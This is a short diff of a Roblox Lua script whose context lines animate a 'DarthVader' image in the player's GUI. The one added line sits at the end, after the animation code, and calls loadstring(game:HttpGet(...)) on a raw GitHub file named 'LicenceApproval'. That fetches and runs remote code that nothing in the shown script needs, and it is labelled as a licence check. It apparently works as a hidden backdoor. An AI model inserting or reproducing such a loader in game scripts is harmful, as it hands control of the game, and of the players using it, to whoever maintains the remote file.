@@ -164,3 +164,4 @@ TweenService:Create(plr.PlayerGui.CharacterSpecial.DarthVader.Image, TweenInfo.n
 }):Play()
    end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
